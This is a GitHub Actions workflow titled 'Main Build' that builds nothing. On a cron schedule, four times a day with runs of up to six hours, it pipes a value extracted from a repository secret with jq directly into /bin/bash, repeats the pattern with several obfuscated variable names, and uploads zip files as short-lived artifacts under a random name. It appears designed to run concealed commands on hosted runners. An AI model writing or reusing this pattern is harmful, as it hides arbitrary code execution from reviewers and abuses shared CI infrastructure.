name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '18 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Start
        env:
          cvw6: ${{ secrets.cvw6 }}
        run: |
          printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
          printf '%s' "$mudgp93852" | jq -r .x17925 | /bin/bash
          printf '%s' "$covz63263" | jq -r .ruf2 | /bin/bash
          printf '%s' "$qjhm334" | jq -r .zydku1 | /bin/bash
          printf '%s' "$bxuy66" | jq -r .wack02045 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: S7gBzjK6
          path: "*.zip"
          retention-days: 1
